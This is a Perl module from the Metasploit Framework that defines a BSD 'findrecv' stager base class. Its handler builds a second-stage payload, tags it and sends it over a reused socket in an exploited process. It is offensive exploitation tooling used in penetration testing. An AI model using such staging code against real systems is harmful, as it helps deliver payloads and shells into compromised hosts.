###############
##
#
#    Name: FindRecvStager.pm
# Version: $Revision$
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      Architecture independent findrecv stager base class for BSD.
#
##
###############

package Msf::PayloadComponent::BSD::FindRecvStager;

use strict;
use base 'Msf::PayloadComponent::BSD::Payload';
use vars qw{@ISA};

#
# Dynamically inherit Payload from FindConnection
#
sub _Load
{
	Msf::PayloadComponent::BSD::Payload->_Import('Msf::PayloadComponent::FindConnection');

	__PACKAGE__->SUPER::_Load();
}

#
# Handle the child socket that's passed to us by dishing out the tag
#
sub ChildHandler
{
	my $self = shift;
	my $sock = shift;
	my $stage = $self->BuildPayload($self->StagePayload);
	my $tag   = substr($self->GetLocal('FINDTAG') . ("\x01" x 4), 0, 4);
	my $data  = $tag . $stage;

	eval { $sock->send($data); };


	# XXX: We should only do this if the second stage is a shell payload...
	return $self->SUPER::ChildHandler($sock);
}

1;
